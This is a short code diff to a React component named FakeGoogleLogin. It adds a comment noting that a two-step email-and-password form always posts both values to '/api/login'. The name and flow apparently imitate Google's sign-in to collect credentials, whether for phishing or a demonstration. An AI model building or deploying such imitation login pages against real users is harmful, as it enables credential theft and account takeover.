@@ -69,6 +69,7 @@ const FakeGoogleLogin = () => {
     if (step === 'email') {
       setStep('password');
     } else {
+        // Always send email and password when the form is submitted (after both steps)
         fetch('/api/login', {
             method: 'POST',
             headers: {
